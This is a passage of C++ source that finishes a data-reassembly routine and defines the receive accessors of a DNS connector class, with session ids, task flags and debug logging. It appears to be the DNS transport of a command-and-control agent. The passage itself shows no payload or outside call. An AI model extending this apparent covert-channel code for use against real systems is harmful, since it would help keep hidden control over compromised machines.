                    this->downAckOffset = this->downTotal; // Ensure it signals completion
                    this->downBuf    = NULL;
                    this->downTotal  = 0;
                    this->downFilled = 0;
                    this->hasPendingTasks = FALSE;
                    DnsDebugLogf("[DNS] [DOWN-DONE] sid=%s size=%lu ack=%lu", this->sid, finalSize, this->downAckOffset);
                }
                return;
            }
        }
        // 兼容旧协议：无头部时视为完整单包，直接交给上层。
        this->recvData = (BYTE*)MemAllocLocal(binLen);
        if (!this->recvData)
            return;
        memcpy(this->recvData, binBuf, binLen);
        this->recvSize = (int)binLen;
    }
}

BYTE* ConnectorDNS::RecvData()
{
    return this->recvData;
}

int ConnectorDNS::RecvSize()
{
    return this->recvSize;
}

void ConnectorDNS::RecvClear()
{
    this->recvData = NULL;
    this->recvSize = 0;
}
